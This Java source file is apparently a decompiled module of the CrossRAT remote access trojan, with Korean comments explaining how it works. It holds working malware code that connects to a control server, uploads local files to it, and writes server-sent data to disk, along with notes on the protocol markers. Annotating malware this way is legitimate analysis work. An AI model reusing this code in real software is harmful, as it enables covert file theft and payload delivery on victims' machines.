package crossrat;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;

public final class d extends Thread {
    private Socket a;
    private String b;
    private int c;
    private String d;
    private String e;
    private String f;
    private String g;

    // constructor
    public d(String var1, int var2, String var3, String var4, String var5, String var6) {
        this.b = var1;
        this.c = var2;
        this.d = var3;
        this.e = var4;
        this.f = var5;
        this.g = var6;
    }

    // var1이라는 이름의 파일을 읽음
    // var2와 var3가 포함된 문자열을 만들어서 출력하고
    // var1 파일의 내용을 2048 bytes만큼씩 서버에 출력
    private void a(String var1, String var2, String var3) {
        // var4: Socket output stream
        DataOutputStream var4 = new DataOutputStream(this.a.getOutputStream());
        FileInputStream var6 = new FileInputStream(var1);
        var4.writeBytes(k.g + k.d + k.G + k.d + var2 + k.d + var3 + k.d + "&&&"); // 뭔가를 var4에 기록
        // [UUID]$#@@0010$#@[var2]$#@[var3]$#@&&&
        // var4 : 기록할 파일
        // var6 : 읽어들인 파일
        // k.g: String (랜덤 UUID로 client.java에서 assign됨)
        // k.d: $#@
        // k.G: @0010

        try {
            Thread.sleep(2000L);
        } catch (Exception var5) {
            var5.printStackTrace();
        }

        byte[] var7 = new byte[2048];

        while (var6.read(var7) > 0) {
            // 서버에 var1이라는 파일의 내용을 출력한다.
            var4.write(var7);
        }

        var6.close();
        var4.close();
    }

    // var1이라는 파일을 열고
    // 서버로 수상한 문자열을 전송한 뒤
    // 서버에서 무언가를 받아서 var1이라는 파일에 기록한다.
    private void b(String var1, String var2, String var3) {
        DataInputStream var4 = new DataInputStream(this.a.getInputStream());
        FileOutputStream var7 = new FileOutputStream(var1);
        // 서버로 수상한 문자열을 전송한다.
        (new DataOutputStream(this.a.getOutputStream())).writeBytes(k.g + k.d + k.H + k.d + var2 + k.d + var3 + k.d + "&&&");
        // [UUID]$#@@0011$#@[var2]$#@[var3]$#@&&&

        try {
            Thread.sleep(2000L);
        } catch (Exception var6) {
            var6.printStackTrace();
        }

        byte[] var8 = new byte[2048];
        int var5 = Integer.parseInt(var3);

        int var9;
        while ((var9 = var4.read(var8, 0, Math.min(2048, var5))) > 0) {
            var5 -= var9;
            var7.write(var8, 0, var9);
        }

        var7.close();
        var4.close();
    }

    public final void run() {
        try {
            // this.b와 this.c가 k.b와 k.c인 경우, 서버와 연결된 Socket을 만들고 this.a에 저장한다.
            this.a = new Socket(this.b, this.c);
            if (this.g == "0") {
                this.a(this.d, this.e, this.f);
            }

            if (this.g == "1") {
                this.b(this.d, this.e, this.f);
                return;
            }
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }
}
